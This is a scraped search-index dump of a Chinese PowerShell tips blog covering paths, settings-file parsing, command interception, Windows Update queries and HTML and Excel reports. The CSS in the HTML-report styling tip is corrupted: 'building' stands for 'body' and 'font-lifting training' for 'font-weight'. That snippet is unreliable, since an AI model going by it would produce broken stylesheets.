C:\\Users\\tobwePS&gt; $ExecutionContext.SessionState.Path.CurrentFileSystemLocationPath----C:\\Users\\tobwePS&gt; Get-LocationPath----HKCU:\\ CurrentFileSystemLocation 总是返回文件系统的当前位置，这可能和 Get-Location 返回的不一样。","link":"/2017/07/19/finding-powershell-s-current-file-system-path/"},{"title":"PowerShell 技能连载 - 理解 PowerShell 和文件系统","text":"PowerShell 维护着它自己的位置： 12345PS&gt; Get-LocationPath----C:\\Users\\tobwe 当前路径指向所有 cmdlet 使用的相对路径。 12345678910111213PS&gt; Get-LocationPath----C:\\Users\\tobwePS&gt; Resolve-Path -Path .Path----C:\\Users\\tobwe 还有另一个当前路径，是由 Windows 维护的，影响所有 .NET 方法。它可能 PowerShell 的当前路径不同： 1234567PS&gt; [Environment]::CurrentDirectoryC:\\testPS&gt; [System.IO.Path]::GetFullPath('.')C:\\testPS&gt; 所以如果在脚本中使用跟文件系统有关的 .NET 方法，可能需要先同步两个路径。这行代码确保 .NET 使用和 PowerShell 相同的文件系统路径： 1PS&gt; [Environment]::CurrentDirectory = $ExecutionContext.SessionState.Path.CurrentFileSystemLocation 同步之后，cmdlet 和 .NET 方法在同一个路径上工作： 12345678910PS&gt; [Environment]::CurrentDirectory = $ExecutionContext.SessionState.Path.CurrentFileSystemLocationPS&gt; [System.IO.Path]::GetFullPath('.')C:\\Users\\tobwePS&gt; Resolve-Path '.'Path----C:\\Users\\tobwe","link":"/2017/07/20/understanding-powershell-and-system-paths/"},{"title":"PowerShell 技能连载 - 当 Add-Type 失败之后","text":"Add-Type 可以将外部 DLL 文件中的 .NET 程序集载入 PowerShell 中。这在大多数情况下工作量好，以下是一个调用示例（当然，需要 SharePoint DLL 可用）： 1PS&gt; Add-Type -Path &quot;C:\\SharepointCSMO\\Microsoft.SharePoint.Client.dll&quot; 但是对某些 DLL 文件，这个命令会执行失败，PowerShell 返回一个““Unable to load one or more of the requested types. Retrieve the LoaderExceptions property for more information.”异常。 如果发生这种情况，一种解决办法是使用过时的（但是仍然可用的）LoadFrom() 方法： 1PS&gt; [Reflection.Assembly]::LoadFrom(&quot;C:\\SharepointCSMO\\Microsoft.SharePoint.Client.dll&quot;) 为什么 Add-Type 方法会失败？Add-Type 维护着一个定制的和程序集相关的版本号。所以如果您试图加载的文件版本比期望的低，Add-Type 会拒绝加载它。相比之下，LoadFrom() 不关心版本号，所以和旧版本兼容。","link":"/2017/07/21/when-add-type-fails/"},{"title":"PowerShell 技能连载 - 在 PowerShell 标题栏中添加实时时钟（第一部分）","text":"要持续地更新 PowerShell 的标题栏，例如显示当前的日期和时间，您需要一个后台线程来处理这个工作。如果没有后台线程，PowerShell 会一直不停地忙于更新标题栏，导致无法使用。 以下是一个演示了如何在标题栏显示实时时钟的代码片段： 1234567891011121314151617181920$code ={ # submit the host process RawUI interface and the execution context param($RawUi) do { # compose the time and date display $time = Get-Date -Format 'HH:mm:ss dddd MMMM d' # compose the title bar text $title = &quot;Current Time: $time&quot; # output the information to the title bar of the host process $RawUI.WindowTitle = $title # wait a half second Start-Sleep -Milliseconds 500 } while ($true)}$ps = [PowerShell]::Create()$null = $ps.AddScript($code).AddArgument($host.UI.RawUI)$handle = $ps.BeginInvoke() 这里最关键的是将 $host.UI.RawUI 对象从 PowerShell 前台传递给后台线程代码。只有这样，后台线程才能存取 PowerShell 前台拥有的标题栏对象。","link":"/2017/07/24/adding-live-clock-to-powershell-title-bar-part-1/"},{"title":"PowerShell 技能连载 - 在 PowerShell 标题栏中添加实时时钟（第二部分）","text":"在前一个技能中我们演示了一段代码，可以在后台线程中更新 PowerShell 标题栏，显示一个实时时钟。 难道不能更完美一点，显示当前的路径位置？挑战之处在于，如何让后台线程知道前台 PowerShell 的当前路径？ 有一个名为 $ExecutionContext 的 PowerShell 变量可以提供关于上下文状态的各种有用信息，包括当前路径。我们将 $ExecutionContext 从前台传递给后台线程，该后台线程就可以显示当前前台的路径。 试试看： 12345678910111213141516171819202122$code ={ # submit the host process RawUI interface and the execution context param($RawUi, $ExecContext) do { # find the current location in the host process $location = $ExecContext.SessionState.Path.CurrentLocation # compose the time and date display $time = Get-Date -Format 'HH:mm:ss dddd MMMM d' # compose the title bar text $title = &quot;$location $time&quot; # output the information to the title bar of the host process $RawUI.WindowTitle = $title # wait a half second Start-Sleep -Milliseconds 500 } while ($true)}$ps = [PowerShell]::Create()$null = $ps.AddScript($code).AddArgument($host.UI.RawUI).AddArgument($ExecutionContext)$handle = $ps.BeginInvoke() 当您运行这段代码时，PowerShell 的状态栏显示当前路径和实时时钟。当您切换当前路径时，例如运行 “cd c:\\windows“，标题栏会立刻更新。 用以上代码可以处理许多使用场景： 您可以在午餐时间快到时显示通知 您可以在指定时间之后结束 PowerShell 会话 您可以在标题栏中显示 RSS 订阅项目","link":"/2017/07/25/adding-live-clock-to-powershell-title-bar-part-2/"},{"title":"PowerShell 技能连载 - 简单解析设置文件（第一部分）","text":"假设您需要将设置用最简单的方式保存到一个文件中。设置文件可能看起来像这样： 1234567$settings = 'Name=WeltnerFirstName=TobiasID=12Country=GermanyConf=psconf.eu' 您可以将这些设置用 Set-Content 保存到文件中，并用 Get-Content 再把它们读出来。 那么，如何解析该信息，来存取独立的项目呢？有一个名为 ConvertFrom-StringData 的 cmdlet，可以将键值对转化为哈希表： 123456789101112$settings = @'Name=WeltnerFirstName=TobiasID=12Country=GermanyConf=psconf.eu'@$hash = $settings | ConvertFrom-StringData$hash.Name$hash.Country","link":"/2017/07/26/easy-parsing-of-setting-files-part-1/"},{"title":"PowerShell 技能连载 - 简单解析设置文件（第二部分）","text":"在前一个技能中我们使用了 ConvertFrom-StringData 来将纯文本键值对转换为哈希表。 以下是一个转换失败的例子： 123456$settings = @'Machine=Server12Path=c:\\test'@$settings | ConvertFrom-StringData 当您查看结果时，很快能发现失败的原因： 1234Name Value---- -----Machine Server12Path c: est 显然，ConvertFrom-StringData 将 “\\“ 视为一个转义符，在上述例子中增加了一个制表符 (“\\t“)，并吃掉了字面量 “t”。 要解决这个问题，请始终将 “\\“ 转义为 “\\\\“。以下是正确的代码： 123456$settings = @'Machine=Server12Path=c:\\\\test'@$settings | ConvertFrom-StringData 现在结果看起来正确了： 1234Name Value---- -----Machine Server12Path c:\\test","link":"/2017/07/27/easy-parsing-of-setting-files-part-2/"},{"title":"PowerShell 技能连载 - 简单解析设置文件（第三部分）","text":"在前一个技能中我们了解了 ConvertFrom-StringData 如何将纯文本的键值对转换为哈希表。还缺少另一个方向的操作：将哈希表转为纯文本。有了它以后，您就拥有了一个将设置和信息保存到文件的小型框架。 我们首先创建一个包含一些数据的哈希表： 1234567$test = @{ Name = 'Tobias' ID = 12 Conf = 'PowerShell Conference EU'}$test 结果看起来如下： 12345Name Value---- -----Conf PowerShell Conference EUName TobiasID 12 以下是名为 ConvertFrom-Hashtable 的函数，传入一个哈希表，并将它转换为纯文本： 123456789101112131415filter ConvertFrom-Hashtable{ $_.GetEnumerator() | ForEach-Object { # get hash table key and value $value = $_.Value $name = $_.Name # escape &quot;\\&quot; in strings if ($value -is [string]) { $value = $value.Replace('\\','\\\\') } # compose key-value pair as plain text '{0}={1}' -f $Name, $value }} 让我们看看哈希表是如何转换的： 123456PS&gt; $test | ConvertFrom-HashtableConf=PowerShell Conference EUName=TobiasID=12PS&gt; 您可以用 ConvertFrom-StringData 转换到另一种形式： 1234567891011PS&gt; $test | ConvertFrom-Hashtable | ConvertFrom-StringDataName Value---- -----Conf PowerShell Conference EUName TobiasID 12PS&gt; 所以基本上，您可以将哈希表保存为纯文本，并在稍后使用它： 12345678910111213141516$test = @{ Name = 'Tobias' ID = 12 Conf = 'PowerShell Conference EU'}$path = &quot;$env:temp\\settings.txt&quot;# save hash table as file$test | ConvertFrom-Hashtable | Set-Content -Path $path -Encoding UTF8notepad $path# read hash table from fileGet-Content -Path $path -Encoding UTF8 | ConvertFrom-StringData | Out-GridView 请注意这种方法对简单的字符串和数字型数据有效。它不能处理复杂数据类型，因为这个转换操作并不能序列化对象。","link":"/2017/07/28/easy-parsing-of-setting-files-part-3/"},{"title":"PowerShell 技能连载 - 替换命令","text":"PowerShell 有一系列“秘密”的（更好的说法是没有在文档中体现的）设置。一个是 PreCommandLookupAction，它有一个很强的功能：当 PowerShell 一旦准备好执行一个命令时，就会先执行这个操作。 您的事件处理器可以调整、改变，操作护原始的命令，以及提交给它的参数。 今天我们将用这个简单的特性来秘密地将一个命令替换成另一个： 1234567891011121314151617181920212223$ExecutionContext.SessionState.InvokeCommand.PreCommandLookupAction = { # is called whenever a command is ready to execute param($command, $eventArgs) # not executed internally by PowerShell if ($command -eq 'Get-Service' -and $eventArgs.CommandOrigin -eq 'Runspace') { # tell PowerShell what to do instead of # running the original command $eventArgs.CommandScriptBlock = { # run the original command without &quot;*&quot;, and # submit original arguments if there have been any $command = 'dir' $( if ($args.Count -eq 0) { &amp; $command } else { &amp; $command $args } ) }.GetNewClosure() }} 这个事件处理器寻找 Get-Service 命令，并将它替换成 dir。所以当您运行 Get-Service 时，会变成获得一个文件夹列表。当然，这是没有实际意义的，正常情况下应该使用 alias 别名。下一个技巧中，我们将演示一些更有用的例子。","link":"/2017/07/31/replacing-commands/"},{"title":"PowerShell 技能连载 - 自动记录命令输出","text":"在前一个技能中我们介绍了自 PowerShell 3 以上版本支持的 PreCommandLookupAction。今天我们将介绍一个特别的实现。 当您运行一下代码时，PowerShell 将会接受所有以 “*” 开头的命令并将命令的输出记录到一个文本文件中。当命令执行完毕，将会打开该文本文件。 现在您可以运行 *dir 来代替 dir，来保存结果，或用 *Get-Process 代替 Get-Process。 1234567891011121314151617181920212223242526272829303132333435$ExecutionContext.SessionState.InvokeCommand.PreCommandLookupAction = { # is called whenever a command is ready to execute param($command, $eventArgs) # check commands that start with &quot;*&quot; and were not # executed internally by PowerShell if ($command.StartsWith('*') -and $eventArgs.CommandOrigin -eq 'Runspace') { # save command output here $debugPath = &quot;$env:temp\\debugOutput.txt&quot; # clear text file if it exists $exists = Test-Path $debugPath if ($exists) { Remove-Item -Path $debugPath } # remove leading &quot;*&quot; from a command name $command = $command.Substring(1) # tell PowerShell what to do instead of # running the original command $eventArgs.CommandScriptBlock = { # run the original command without &quot;*&quot;, and # submit original arguments if there have been any $( if ($args.Count -eq 0) { &amp; $command } else { &amp; $command $args } ) | # log output to file Tee-Object -FilePath $debugPath | # open the file once all output has been processed ForEach-Object -Process { $_ } -End { if (Test-Path $debugPath) { notepad $debugPath } } }.GetNewClosure() }}","link":"/2017/08/01/auto-logging-command-output/"},{"title":"PowerShell 技能连载 - 查找已安装和缺失的更新（第一部分）","text":"Windows 可以自动确定系统中缺失的更新，在有 Internet 连接的情况下。PowerShell 可以使用相同的系统接口来查询该信息。以下代码返回系统中所有已安装的更新： 123456789#requires -Version 2.0$Session = New-Object -ComObject Microsoft.Update.Session$Searcher = $Session.CreateUpdateSearcher()$updates = $Searcher.Search(&quot;IsInstalled=1&quot;).Updates$updates | Select-Object Title, LastDeployment*, Description, SupportUrl, MsrcSeverity | Out-GridView 要查看缺失的更新，请将 IsInstalled=1 改为 IsInstalled=0： 123456789#requires -Version 2.0$Session = New-Object -ComObject Microsoft.Update.Session$Searcher = $Session.CreateUpdateSearcher()$updates = $Searcher.Search(&quot;IsInstalled=0&quot;).Updates$updates | Select-Object Title, LastDeployment*, Description, SupportUrl, MsrcSeverity | Out-GridView","link":"/2017/08/02/finding-installed-updates-and-searching-for-missing-part-1/"},{"title":"PowerShell 技能连载 - 查找已安装和缺失的更新（第二部分）","text":"当 PowerShell 通过 Microsoft.Update.Session 对象向 Windows 请求更新时，一些信息似乎无法读取。以下代码获取已安装的更新信息。而 KBArticleIDs 只是显示为 ComObject。 123456789#requires -Version 2.0$Session = New-Object -ComObject Microsoft.Update.Session$Searcher = $Session.CreateUpdateSearcher()$updates = $Searcher.Search(&quot;IsInstalled=1&quot;).Updates$updates | Select-Object -Property Title, LastDeploy*, Desc*, MaxDownload*, KBArticleIDs | Out-GridView 要解决这个问题，请使用计算属性。它能将无法读取的 COM 对象通过管道传给 Out-String 命令。通过这种方法，PowerShell 内部的内部逻辑使用它的魔力来解析 COM 对象内容： 1234567891011121314#requires -Version 2.0$Session = New-Object -ComObject Microsoft.Update.Session$Searcher = $Session.CreateUpdateSearcher()$updates = $Searcher.Search(&quot;IsInstalled=1&quot;).Updates$KBArticleIDs = @{ Name = 'KBArticleIDs' Expression = { ($_.KBArticleIDs | Out-String).Trim() }}$updates | Select-Object -Property Title, LastDeploy*, Desc*, MaxDownload*, $KBArticleIDs | Out-GridView","link":"/2017/08/03/finding-installed-updates-and-searching-for-missing-part-2/"},{"title":"PowerShell 技能连载 - 查找已安装和缺失的更新（第三部分）","text":"当您想检查系统中已安装的更新，与其搜索在线更新，并和本地安装的更新比对，更好的方法是查询本地更新历史。 以下代码返回系统中所有已存在的更新。它不需要在线连接。 12345678910111213141516171819#requires -Version 2.0$Session = New-Object -ComObject &quot;Microsoft.Update.Session&quot;$Searcher = $Session.CreateUpdateSearcher()$historyCount = $Searcher.GetTotalHistoryCount()$status = @{ Name=&quot;Operation&quot; Expression= { switch($_.operation) { 1 {&quot;Installation&quot;} 2 {&quot;Uninstallation&quot;} 3 {&quot;Other&quot;} } }}$Searcher.QueryHistory(0, $historyCount) |Select-Object Title, Description, Date, $status |Out-GridView","link":"/2017/08/04/finding-installed-updates-and-searching-for-missing-part-3/"},{"title":"PowerShell 技能连载 - 查找已安装和缺失的更新（第四部分）","text":"有些时候，Microsoft.Update.Session 对象可以用来检查一台机器上是否安装了某个更新。有些作者用这种方法查询更新的标题字符串： 123456789101112131415161718192021222324252627282930313233343536#requires -Version 3.0function Get-UpdateInstalled([Parameter(Mandatory)]$KBNumber){ $Session = New-Object -ComObject &quot;Microsoft.Update.Session&quot; $Searcher = $Session.CreateUpdateSearcher() $historyCount = $Searcher.GetTotalHistoryCount() $status = @{ Name=&quot;Operation&quot; Expression= { switch($_.operation) { 1 {&quot;Installation&quot;} 2 {&quot;Uninstallation&quot;} 3 {&quot;Other&quot;} } } } $Searcher.QueryHistory(0, $historyCount) | Where-Object {$_.Title -like &quot;*KB$KBNumber*&quot; } | Select-Object -Property Title, $status, Date}function Test-UpdateInstalled([Parameter(Mandatory)]$KBNumber){ $update = Get-UpdateInstalled -KBNumber $KBNumber | Where-Object Status -eq Installation | Select-Object -First 1 return $update -ne $null}Test-UpdateInstalled -KBNumber 2267602Get-UpdateInstalled -KBNumber 2267602 | Out-GridView 请注意这个方法不仅更快，而且由于它将任务分成两个函数，所以您还可以读出所有已安装的更新标题： 1234567891011121314151617PS&gt; Get-UpdateInstalled -KBNumber 2267602Title Operation Date----- --------- ----Definitionsupdate für Windows Defender – KB2267602 (Definition 1.249.348.0) Installation 28.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.249.281.0) Installation 27.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.249.237.0) Installation 26.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.249.191.0) Installation 25.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.249.139.0) Installation 24.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.249.95.0) Installation 22.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.249.93.0) Installation 22.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.249.28.0) Installation 21.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.249.13.0) Installation 20.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.247.1068.0) Installation 19.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.247.1010.0) Installation 18.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.247.969.0) Installation 17.07.20...Definitionsupdate für Windows Defender – KB2267602 (Definition 1.247.966.0) Installation 17.07.20...","link":"/2017/08/07/finding-installed-updates-and-searching-for-missing-part-4/"},{"title":"PowerShell 技能连载 - 在 Windows 10 中控制控制台的透明度","text":"在 Windows 10 中，当您打开一个 PowerShell 控制体态，只需要按住 CTRL + SHIFT 键，然后滚动鼠标滚轮，就可以改变控制台的背景。 要实现这样的功能，请打开控制台的属性窗口，“使用旧版控制台”选项必须勾选。您可以单击控制台标题栏左上角的应用程序图标，然后选择“属性”来打开控制台属性。","link":"/2017/08/08/control-console-transparency-on-windows-10/"},{"title":"PowerShell 技能连载 - 创建 HTML 报表（第一部分 - 创建 HTML）","text":"要将 PowerShell 的处理结果输出为 HTML 报表，只需要将结果用管道传给 ConvertTo-Html，然后将结果保存到文件。所以它最基本的使用形式类似如下。它创建一个包含过去 48 小时发生的所有事件系统错误的报表： 1234567891011121314#requires -Version 2.0# store report here$Path = &quot;$env:temp\\eventreport.htm&quot;# set the start date$startDate = (Get-Date).AddHours(-48)# get data and convert it to HTMLGet-EventLog -LogName System -EntryType Error -After $startDate | ConvertTo-Html | Set-Content -Path $Path# open the file with associated programInvoke-Item -Path $Path 不过，输出的报告可能有点丑，因为包含了许多无用的信息。所以美化的第一步是选择报告中需要的属性。只需要在代码中加入 Select-Object： 123456789101112#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$startDate = (Get-Date).AddHours(-48)Get-EventLog -LogName System -EntryType Error -After $startDate | # select the properties to be included in your report Select-Object -Property EventId, Message, Source, InstanceId, TimeGenerated, ReplacementStrings, UserName | ConvertTo-Html | Set-Content -Path $PathInvoke-Item -Path $Path","link":"/2017/08/09/creating-html-reports-part-1-creating-html/"},{"title":"PowerShell 技能连载 - 创建 HTML 报表（第二部分 - 修复非字符串内容）","text":"在前一个技能中我们开始使用 PowerShell 来将结果转换为 HTML 报告。目前，我们已经生成了报告，但报告的界面看起来很丑。我们从这里开始： 1234567891011#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$startDate = (Get-Date).AddHours(-48)Get-EventLog -LogName System -EntryType Error -After $startDate | Select-Object -Property EventId, Message, Source, InstanceId, TimeGenerated, ReplacementStrings, UserName | ConvertTo-Html | Set-Content -Path $PathInvoke-Item -Path $Path 当您运行这段代码时，报告显示有一些属性包含非字符串内容。请看 “ReplacementStrings” 列：报告中含有 string[]，也就是字符串数组类型，而不是真实数据。 要修复这个问题，请使用计算属性，并且将内容转换为可读的文本： 12345678910111213141516171819#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$startDate = (Get-Date).AddHours(-48)# make sure the property gets piped to Out-String to turn its# content into readable text that can be displayed in the report$replacementStrings = @{ Name = 'ReplacementStrings' Expression = { ($_.ReplacementStrings | Out-String).Trim() }}Get-EventLog -LogName System -EntryType Error -After $startDate | # select the properties to be included in your report Select-Object -Property EventId, Message, Source, InstanceId, TimeGenerated, $ReplacementStrings, UserName | ConvertTo-Html | Set-Content -Path $PathInvoke-Item -Path $Path 如您所见，该属性现在能正常显示它的内容了。 要如何将属性内容转换成可读的文本依赖于您的选择。如果将属性通过管道传给 Out-String，将把转换工作留给 PowerShell 自动完成。如果您希望更精细的控制，而且某个属性包含一个数组，您也可以使用 -join 操作符来连接数组元素。通过这种方式，您可以选择使用哪种分隔符来分割数组元素。以下例子使用逗号分隔： 12345678910111213141516171819#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$startDate = (Get-Date).AddHours(-48)# make sure the property gets piped to Out-String to turn its# content into readable text that can be displayed in the report$replacementStrings = @{ Name = 'ReplacementStrings' Expression = { $_.ReplacementStrings -join ',' }}Get-EventLog -LogName System -EntryType Error -After $startDate | # select the properties to be included in your report Select-Object -Property EventId, Message, Source, InstanceId, TimeGenerated, $ReplacementStrings, UserName | ConvertTo-Html | Set-Content -Path $PathInvoke-Item -Path $Path","link":"/2017/08/10/creating-html-reports-part-2-fixing-non-string-content/"},{"title":"PowerShell 技能连载 - 创建 HTML 报表（第三部分 - 增加头部和尾部）","text":"在前一个技能中我们开始将 PowerShell 的结果转换为 HTML 报告。现在，这份报告需要一些头部和尾部。以下是我们上一个版本的代码： 12345678910111213141516#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$startDate = (Get-Date).AddHours(-48)$replacementStrings = @{ Name = 'ReplacementStrings' Expression = { $_.ReplacementStrings -join ',' }}Get-EventLog -LogName System -EntryType Error -After $startDate | Select-Object -Property EventId, Message, Source, InstanceId, TimeGenerated, $ReplacementStrings, UserName | ConvertTo-Html | Set-Content -Path $PathInvoke-Item -Path $Path 要在数据前后加入内容，请使用 -PreContent 和 -PostContent 参数。比如在头部加入机器名，在尾部加入版权信息，请使用以下代码： 123456789101112131415161718192021222324#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$today = Get-Date$startDate = $today.AddHours(-48)$startText = $startDate.ToString('MMMM dd yyyy, HH:ss')$endText = $today.ToString('MMMM dd yyyy, HH:ss')$preContent = &quot;&lt;h1&gt;$env:computername&lt;/h1&gt;&lt;h3&gt;Error Events from $startText until $endText&lt;/h3&gt;&quot;$postContent = &quot;&lt;p&gt;&lt;i&gt;(C) 2017 SysAdmin $today&lt;/i&gt;&lt;/p&gt;&quot;$replacementStrings = @{ Name = 'ReplacementStrings' Expression = { $_.ReplacementStrings -join ',' }}Get-EventLog -LogName System -EntryType Error -After $startDate | Select-Object -Property EventId, Message, Source, InstanceId, TimeGenerated, $ReplacementStrings, UserName | ConvertTo-Html -PreContent $preContent -PostContent $postContent | Set-Content -Path $PathInvoke-Item -Path $Path","link":"/2017/08/11/creating-html-reports-part-3-adding-headers-and-footers/"},{"title":"PowerShell 技能连载 - 创建 HTML 报表（第四部分 - 重命名列）","text":"在之前的技能中我们开始将 PowerShell 结果转为 HTML 报告。现在报告的结果接近完成了。我们只需要对某些列标题进行润色和重命名即可。这是上一次的脚本： 123456789101112131415161718192021222324#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$today = Get-Date$startDate = $today.AddHours(-48)$startText = $startDate.ToString('MMMM dd yyyy, HH:ss')$endText = $today.ToString('MMMM dd yyyy, HH:ss')$preContent = &quot;&lt;h1&gt;$env:computername&lt;/h1&gt;&lt;h3&gt;Error Events from $startText until $endText&lt;/h3&gt;&quot;$postContent = &quot;&lt;p&gt;&lt;i&gt;(C) 2017 SysAdmin $today&lt;/i&gt;&lt;/p&gt;&quot;$replacementStrings = @{ Name = 'ReplacementStrings' Expression = { $_.ReplacementStrings -join ',' }}Get-EventLog -LogName System -EntryType Error -After $startDate | Select-Object -Property EventId, Message, Source, InstanceId, TimeGenerated, $ReplacementStrings, UserName | ConvertTo-Html -PreContent $preContent -PostContent $postContent | Set-Content -Path $PathInvoke-Item -Path $Path 要重命名列标题，请使用之前同样的策略将非字符串内容转换为字符串内容：使用计算属性。所以如果您想将 TimeGenerated 重命名为 Time，那么可以这样做： 12345678910111213141516171819202122232425262728293031#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$today = Get-Date$startDate = $today.AddHours(-48)$startText = $startDate.ToString('MMMM dd yyyy, HH:ss')$endText = $today.ToString('MMMM dd yyyy, HH:ss')$preContent = &quot;&lt;h1&gt;$env:computername&lt;/h1&gt; &lt;h3&gt;Error Events from $startText until $endText&lt;/h3&gt;&quot;$postContent = &quot;&lt;p&gt;&lt;i&gt;(C) 2017 SysAdmin $today&lt;/i&gt;&lt;/p&gt;&quot;$replacementStrings = @{ Name = 'ReplacementStrings' Expression = { $_.ReplacementStrings -join ',' }}$timeGenerated = @{ # specify NEW name for column (property) Name = 'Time' # use existing value Expression = { $_.TimeGenerated }}Get-EventLog -LogName System -EntryType Error -After $startDate | Select-Object -Property EventId, Message, Source, InstanceId, $TimeGenerated, $ReplacementStrings, UserName | ConvertTo-Html -PreContent $preContent -PostContent $postContent | Set-Content -Path $PathInvoke-Item -Path $Path","link":"/2017/08/14/creating-html-reports-part-4-renaming-columns/"},{"title":"PowerShell 技能连载 - 创建 HTML 报表（第五部分 - 应用样式和设计）","text":"在前一个技能中我们开始将 PowerShell 的结果转换为 HTML 报告。报告内容目前一切正常。要使人加深印象，结果需要做一些设计改进。以下是我们之前的成果： 1234567891011121314151617181920212223242526272829#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$today = Get-Date$startDate = $today.AddHours(-48)$startText = $startDate.ToString('MMMM dd yyyy, HH:ss')$endText = $today.ToString('MMMM dd yyyy, HH:ss')$preContent = &quot;&lt;h1&gt;$env:computername&lt;/h1&gt; &lt;h3&gt;Error Events from $startText until $endText&lt;/h3&gt;&quot;$postContent = &quot;&lt;p&gt;&lt;i&gt;(C) 2017 SysAdmin $today&lt;/i&gt;&lt;/p&gt;&quot;$replacementStrings = @{ Name = 'ReplacementStrings' Expression = { $_.ReplacementStrings -join ',' }}$timeGenerated = @{ Name = 'Time' Expression = { $_.TimeGenerated }}Get-EventLog -LogName System -EntryType Error -After $startDate | Select-Object -Property EventId, Message, Source, InstanceId, $TimeGenerated, $ReplacementStrings, UserName | ConvertTo-Html -PreContent $preContent -PostContent $postContent | Set-Content -Path $PathInvoke-Item -Path $Path 要改进它的样式，可以对报告应用 HTML CSS 样式（层叠样式表）。CSS 决定了报告中所有 HTML 元素的样式细节。您可以在 -Head 参数中插入一个 CSS 样式表： 123456789101112131415161718192021222324252627282930313233343536373839#requires -Version 2.0$Path = &quot;$env:temp\\eventreport.htm&quot;$today = Get-Date$startDate = $today.AddHours(-48)$startText = $startDate.ToString('MMMM dd yyyy, HH:ss')$endText = $today.ToString('MMMM dd yyyy, HH:ss')$headContent = '&lt;title&gt;Event Report&lt;/title&gt;&lt;style&gt;building { background-color:#EEEEEE; }building, table, td, th { font-family: Consolas; color:Black; Font-Size:10pt; padding:15px;}th { font-lifting training:bold; background-color:#AAFFAA; text-align:left; }td { font-color:#EEFFEE; }&lt;/style&gt;'$preContent = &quot;&lt;h1&gt;$env:computername&lt;/h1&gt; &lt;h3&gt;Error Events from $startText until $endText&lt;/h3&gt;&quot;$postContent = &quot;&lt;p&gt;&lt;i&gt;(C) 2017 SysAdmin $today&lt;/i&gt;&lt;/p&gt;&quot;$replacementStrings = @{ Name = 'ReplacementStrings' Expression = { $_.ReplacementStrings -join ',' }}$timeGenerated = @{ Name = 'Time' Expression = { $_.TimeGenerated }}Get-EventLog -LogName System -EntryType Error -After $startDate | Select-Object -Property EventId, Message, Source, InstanceId, $TimeGenerated, $ReplacementStrings, UserName | ConvertTo-Html -PreContent $preContent -PostContent $postContent -Head $headContent | Set-Content -Path $PathInvoke-Item -Path $Path 应用一个样式表之后，报告会一下子变得清新现代起来。 如果您希望更多地控制您的 HTML 报告，您可以停止使用 ConvertTo-Html，而改用自己的逻辑通过报告数据来生成 HTML 表格。不过这超出了我们快速技能的范畴。","link":"/2017/08/15/creating-html-reports-part-5-applying-style-and-design/"},{"title":"PowerShell 技能连载 - 创建 Excel 报表（第一部分——黑白）","text":"用 PowerShell 创建一个最简单的 Excel 报表只需要几行代码：将结果导出为 CSV 文件，然后将它作为参数启动 Excel： 123456789#requires -Version 2.0$timestamp = Get-Date -Format 'yyyy-MM-dd HH-mm-ss'$Path = &quot;$env:temp\\Excel Report $timestamp.csv&quot;Get-Service | Export-Csv -Path $Path -Encoding UTF8 -UseCulture -NoTypeInformationStart-Process -FilePath excel -ArgumentList &quot;&quot;&quot;$Path&quot;&quot;&quot; 有一些需要注意的事项： Excel 打开一个文件时会将它锁定。所以请在文件名之前加上时间戳或其它唯一的识别名。否则，当您多次运行脚本而没有关闭之前的文档会遇到错误。 当导出数据到 CSV 时，请使用 UTF-8 编码，来保留特殊字符。 同样地，确保 CSV 和 Excel 使用相同的分隔符。只需要使用 -UseCulture 来使用注册表中设置的分隔符即可。 当启动 Excel 时，请确保将路径置于双引号中，否则，如果路径中包含空格，Excel 将找不到该文件。","link":"/2017/08/16/creating-excel-reports-part-1-black-and-white/"},{"title":"PowerShell 技能连载 - 创建 Excel 报表（第二部分——彩色）","text":"当从 CSV 中导入数据到 Excel 时，您无法指定格式，包括字体和颜色等。从 HTML 数据中导入 Excel 则可以包含格式。以下是一个演示创建一个带格式的彩色 Excel 报告是多么容易的例子，假设报表中包含一张表格： 123456789101112131415161718192021222324252627#requires -Version 2.0$html = &amp; { '&lt;table&gt;' '&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Status&lt;/th&gt;&lt;/tr&gt;' Get-Service | ForEach-Object { if ($_.Status -eq 'Running') { $color = 'green' } else { $color = 'red' } '&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;td bgcolor=&quot;{2}&quot;&gt;{1}&lt;/td&gt;&lt;/tr&gt;' -f $_.Name, $_.Status, $color } '&lt;/table&gt;'}$PathHTML = &quot;$env:temp\\report.htm&quot;$html | Set-Content $PathHTML -Encoding UTF8# open as HTMLInvoke-Item -Path $PathHTML# open as Excel reportStart-Process -FilePath excel -ArgumentList &quot;&quot;&quot;$PathHTML&quot;&quot;&quot;","link":"/2017/08/17/creating-excel-reports-part-2-colorful/"},{"title":"PowerShell 技能连载 - 创建 Excel 报表（第三部分——独立操作工作簿）","text":"有些时候您可能需要创建非表格形式的，个性化的报表。 对于这种情况， PowerShell 可以连接到 Excel 的对象模型。通过这种方法，您可以操作独立的单元格，读写它们的内容，甚至对它们进行格式化。这给你最大的灵活度。然而，它的缺点是需要大量的编码，因为您需要人工操作每一个单元格。并且，通过 .NET 操作 COM 对象相对比较慢。 以下是起步的代码。它展示了如何连接到 Excel，存取独立的单元格，并应用格式设置： 1234567891011121314151617181920212223242526#requires -Version 2.0Add-Type -AssemblyName System.Drawing# accessing excel via COM$excel = New-Object -ComObject Excel.Application# make it visible (for debugging only, can be set to $false later in production)$excel.Visible = $true# add workbook$workbook = $excel.Workbooks.Add()# access workbook 